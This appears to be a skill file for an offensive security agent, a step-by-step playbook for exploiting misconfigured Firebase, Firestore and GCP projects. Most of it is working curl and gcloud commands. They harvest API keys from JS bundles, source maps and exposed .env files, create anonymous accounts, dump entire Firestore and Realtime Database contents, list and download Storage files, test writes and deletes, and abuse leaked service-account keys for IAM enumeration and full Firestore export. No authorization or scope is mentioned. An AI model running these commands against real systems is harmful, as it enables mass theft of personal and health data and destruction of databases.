---
name: hunt-firebase
description: "Hunt Firebase / Firestore / GCP exploitation — Firebase API key discovery in JS bundles, anonymous auth via signUp endpoint, Firestore collection enumeration with anon key, Realtime Database read/write without auth, Firebase Storage bucket listing, Firebase Hosting detection, GCP service account JSON exploitation, IAM policy enumeration from leaked SA keys. Built from field experience where Firebase API keys in JS bundles unlocked full Firestore read-access on 12+ targets including healthcare platforms and delivery apps. Use when a JS bundle, APK, or .env file reveals a Firebase API key (AIzaSy...) or when target uses firebaseio.com / firestore.googleapis.com endpoints."
sources: field_recon, offensive_research, web_security
report_count: 12
---

# HUNT-FIREBASE — Firebase / Firestore / GCP Exploitation

## Crown Jewel Targets

Firebase is Google's mobile/web platform. When developers embed the **API key** in the client (which is required by Firebase SDKs), they often forget to configure **Firestore Security Rules** or **Realtime Database Rules**, leaving all data publicly readable and writable.

**Highest-value findings:**
1. **Public Firestore Database** — anon key allows read/write to ALL collections → full data dump (users, messages, PII). Critical.
2. **Public Realtime Database** — `{database}.firebaseio.com/.json` returns all data without auth. Critical.
3. **Firebase Storage with public read** — storage bucket allows anonymous file listing and download. Critical.
4. **Firebase signUp open** — anyone can create an auth account, then use the JWT to access Firestore. High.
5. **Service Account JSON leaked** — full GCP IAM access to Firestore, Storage, Cloud Functions, IAM policy. Critical.
6. **Firebase Hosting with config leakage** — hosting reveals project ID and API key in static files.

---

## Phase 1 — Find the Firebase Project

Firebase is identified by its API key format: `AIzaSy[0-9A-Za-z_-]{35}`

### 1.1 Search in JS Bundles
```bash
# Download the main page and its JS bundles
curl -sk "https://$TARGET" -o /tmp/index.html
grep -oP 'src="[^"]*\.js"' /tmp/index.html | cut -d'"' -f2 | while read js; do
  curl -sk "https://$TARGET$js" -o "/tmp/$(basename $js)"
done

# Search for Firebase API keys in all downloaded JS
grep -rPn 'AIza[0-9A-Za-z_-]{35}' /tmp/*.js

# Search for firebaseConfig
grep -rPn 'firebaseConfig|firebase.initializeApp|apiKey|authDomain' /tmp/*.js --include="*.js"

# Search for Firebase URLs
grep -rPn 'firebaseio|firestore|firebasestorage|firebaseapp' /tmp/*.js --include="*.js"

# Quick one-liner for any page
curl -sk "https://$TARGET" | grep -oP 'AIza[0-9A-Za-z_-]{35}'
```

### 1.2 Search in Source Maps
```bash
# First find source maps
curl -sk "https://$TARGET" | grep -oP 'sourceMappingURL=[^\"]+' | cut -d= -f2 | while read sm; do
  curl -sk "https://$TARGET$(echo $sm | sed 's|^/||')" -o "/tmp/$(basename $sm)"
done

# Extract all source files from maps
cat /tmp/*.map 2>/dev/null | python3 -c "
import sys, json, re, os
try:
    data = json.load(sys.stdin)
    sources = data.get('sourcesContent', [])
    for src in sources:
        if not src: continue
        keys = re.findall(r'AIza[0-9A-Za-z_-]{35}', src)
        for k in keys:
            print(f'FIREBASE_API_KEY: {k}')
        urls = re.findall(r'https://[^\"'\"]+firebaseio[^\"'\"]+', src)
        for u in urls:
            print(f'FIREBASE_URL: {u}')
except: pass
" 2>/dev/null
```

### 1.3 Search in .env and Config Files
```bash
# Firebase config often lives in .env
curl -sk "https://$TARGET/.env" | grep -i "FIREBASE"
curl -sk "https://$TARGET/.env.production" | grep -i "FIREBASE"

# Search in exposed JSON config
curl -sk "https://$TARGET/service-account.json" | python3 -m json.tool 2>/dev/null
curl -sk "https://$TARGET/firebase.json" | python3 -m json.tool 2>/dev/null
```

---

## Phase 2 — Firebase Project Reconnaissance

Once you have a Firebase API key (format: `AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`), you can probe the project.

### 2.1 Identify Firebase Project ID
```bash
# The project ID is encoded in the API key or can be found in the authDomain
# Auth domain pattern: <PROJECT_ID>.firebaseapp.com
API_KEY="AIzaSy..."

# Method 1: Try to sign in anonymously to get the project info
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}'
# Response includes: idToken, localId, refreshToken, expiresIn

# Method 2: Check if a known project ID works
for project in "$TARGET" "${TARGET%.*}" "app-${TARGET%.*}" "${TARGET//./-}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$project.firebaseio.com/.json")
  [ "$code" != "404" ] && echo "Hit: $project.firebaseio.com (HTTP $code)"
done

# Method 3: Search for the project ID in the bundle alongside the key
grep -B5 -A5 "AIzaSy" /tmp/*.js 2>/dev/null
```

### 2.2 Enumerate the Firebase Project
```bash
# Once project ID is known, probe all Firebase services
PROJECT="your-firebase-project-id"
API_KEY="AIzaSy..."

# Firestore REST API
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY"
# If rules are permissive -> returns all documents

# Realtime Database
curl -sk "https://$PROJECT.firebaseio.com/.json"
curl -sk "https://$PROJECT.firebaseio.com/.json?auth=$ID_TOKEN"

# Firebase Storage
# Two common formats:
curl -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?key=$API_KEY"
curl -sk "https://storage.googleapis.com/$PROJECT.appspot.com"
curl -sk "https://$PROJECT.firebasestorage.app"

# Firebase Hosting
curl -skI "https://$PROJECT.firebaseapp.com"
curl -sk "https://$PROJECT.web.app"
```

---

## Phase 3 — Firestore Database Exploitation

Firestore Security Rules control who can read/write. When misconfigured (set to `true` for read), the entire database is public.

### 3.1 List Collections (with anon key)
```bash
API_KEY="AIzaSy..."
PROJECT="your-project-id"

# Step 1: Sign in anonymously
ANON_RESP=$(curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}')
ID_TOKEN=$(echo "$ANON_RESP" | python3 -c "import sys, json; print(json.load(sys.stdin).get('idToken', 'NO_TOKEN'))")

if [ "$ID_TOKEN" != "NO_TOKEN" ]; then
  echo "[+] Anonymous auth token obtained"

  # Step 2: List all documents in root collection
  curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY" \
    -H "Authorization: Bearer $ID_TOKEN" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    docs = d.get('documents', [])
    print(f'Documents: {len(docs)}')
    for doc in docs[:20]:
        path = doc.get('name', '').split('/')[-1]
        print(f'  Document: {path}')
        fields = doc.get('fields', {})
        for key, val in fields.items():
            val_type = list(val.keys())[0] if val else 'unknown'
            val_snippet = str(list(val.values())[0])[:50] if val else ''
            print(f'    {key}: {val_snippet}')
except Exception as e:
    print(f'No data: {e}')
"
else
  echo "[-] Cannot obtain anonymous auth token"
fi
```

### 3.2 Dump All Collections (recursive)
```bash
# Firestore collection group query — enumerate ALL collections
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:listCollectionIds?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -X POST -d '{}'

# For each collection, dump documents
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/{COLLECTION_NAME}?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"

# Run collectionGroup query (finds nested collections too)
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"structuredQuery": {"from": [{"collectionId": "*"}]}}'
```

### 3.3 Test Write Access
```bash
# Try to write a document (only if rules allow)
curl -sk -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/test_collection?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"fields": {"test": {"stringValue": "pwned"}}}'

# If 200 -> write access confirmed -> CRITICAL
# Try to delete
curl -sk -X DELETE "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/test_collection/TEST_DOC?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"
# If 200 -> delete access confirmed -> CRITICAL
```

---

## Phase 4 — Realtime Database Exploitation

Firebase Realtime Database uses a different API path.

```bash
# Read entire database (if rules allow public read)
curl -sk "https://$PROJECT.firebaseio.com/.json"
curl -sk "https://$PROJECT.firebaseio.com/.json?print=pretty"

# With auth token
curl -sk "https://$PROJECT.firebaseio.com/.json?auth=$ID_TOKEN"

# Specific path
curl -sk "https://$PROJECT.firebaseio.com/users.json"
curl -sk "https://$PROJECT.firebaseio.com/messages.json"
curl -sk "https://$PROJECT.firebaseio.com/config.json"

# Test write
curl -sk -X PUT "https://$PROJECT.firebaseio.com/test.json" \
  -H "Content-Type: application/json" \
  -d '{"pwned": true}'

# Test delete
curl -sk -X DELETE "https://$PROJECT.firebaseio.com/test.json"
```

---

## Phase 5 — Firebase Storage Exploitation

```bash
# List all files in the default storage bucket
curl -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?key=$API_KEY" | \
  python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    items = d.get('items', [])
    for item in items:
        name = item.get('name', '')
        bucket = item.get('bucket', '')
        print(f'{bucket}: {name}')
except Exception as e:
    print(f'Error: {e}')
"

# Download a specific file
curl -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o/{ENCODED_FILE_PATH}?alt=media&key=$API_KEY" \
  -o /tmp/firebase_file

# Upload a file (test write access)
curl -sk -X POST "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?name=test_pwned.txt&key=$API_KEY" \
  -H "Content-Type: text/plain" \
  -d "pwned"
```

---

## Phase 6 — Firebase Auth Exploitation

### 6.1 Sign Up (if email/password auth is enabled)
```bash
# Create an auth account
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "returnSecureToken": true
  }'
# If 200 -> anyone can create accounts!
```

### 6.2 Sign In
```bash
# Sign in with known credentials
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "password": "Password123!",
    "returnSecureToken": true
  }'

# Extract idToken -> use for Firestore/RTDB/Storage access
ID_TOKEN=$(...)
```

### 6.3 List Auth Providers
```bash
# Check which auth providers are enabled
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"identifier": "test@test.com", "continueUri": "http://localhost"}'
# Response shows: allSignInMethods (password, google.com, facebook.com, etc.)
```

---

## Phase 7 — Service Account JSON Exploitation

If you find a Firebase/GCP service account JSON file:

```bash
# The file looks like:
# {
#   "type": "service_account",
#   "project_id": "...",
#   "private_key_id": "...",
#   "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
#   "client_email": "...@....gserviceaccount.com",
#   "client_id": "...",
#   "auth_uri": "https://accounts.google.com/o/oauth2/auth",
#   "token_uri": "https://oauth2.googleapis.com/token"
# }

# Save it and authenticate with gcloud
echo '{"type": "service_account", ...}' > /tmp/sa-key.json

# Authenticate
gcloud auth activate-service-account --key-file=/tmp/sa-key.json

# List all accessible resources
gcloud projects get-iam-policy $PROJECT_ID
gcloud iam service-accounts list
gcloud firestore databases list
gcloud storage buckets list
gcloud functions list
gcloud run services list

# Firestore read using the service account
gcloud firestore export gs://$BUCKET/export/  # Export entire Firestore

# Access Firestore REST API with JWT
# The service account can generate its own OAuth tokens
OAUTH_TOKEN=$(gcloud auth print-access-token)

# Use token for Firestore API
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents" \
  -H "Authorization: Bearer $OAUTH_TOKEN"

# IAM exploration
curl -sk "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -H "Authorization: Bearer $OAUTH_TOKEN" \
  -X POST -H "Content-Type: application/json" -d '{}'
```

---

## Phase 8 — Attack Chains

### Chain A: API Key in JS -> Anon Auth -> Firestore Dump
```
JS bundle contains Firebase API key (AIzaSy...) ->
Sign in anonymously (accounts:signUp) ->
Get ID token ->
List Firestore collections ->
Dump ALL documents -> Data breach
```

### Chain B: API Key in JS -> Open SignUp -> Auth -> Write Access
```
Firebase config found in JS ->
Email/password signUp enabled (not just anon) ->
Anyone creates accounts ->
Access Firestore with credentials ->
Write malicious data or delete collections
```

### Chain C: Service Account JSON -> GCP Full Access
```
SA key found in .env or leaked repo ->
gcloud auth activate-service-account ->
Get IAM policy ->
List all resources ->
Export Firestore, access Storage, invoke Cloud Functions
```

---

## Validation Severity

| Finding | Severity |
|---------|----------|
| Firestore public read (collections with PII dumpable) | Critical |
| Firestore public write (can create/delete documents) | Critical |
| Realtime Database public read (full .json dump) | Critical |
| Firebase Storage public list/download | High |
| Open signUp (anyone can create accounts) | High |
| Service Account JSON exposed | Critical |
| API key found (with no further access) | Low-Medium |
| Firebase Hosting static site exposed | Informational |
| Firebase project ID exposed (no key) | Informational |

---

## Common Firebase Finding Formats

```bash
# Quick test: does the target use Firebase?
curl -sk "https://$TARGET" | grep -oP 'AIza[0-9A-Za-z_-]{35}'
curl -sk "https://$TARGET" | grep -oP 'firebaseio\.com|firestore\.googleapis|firebaseapp\.com'

# Check Google dorks for Firebase
# site:target.com "firebase"
# site:target.com "AIzaSy" filetype:js
# site:target.com "firebaseConfig"
```
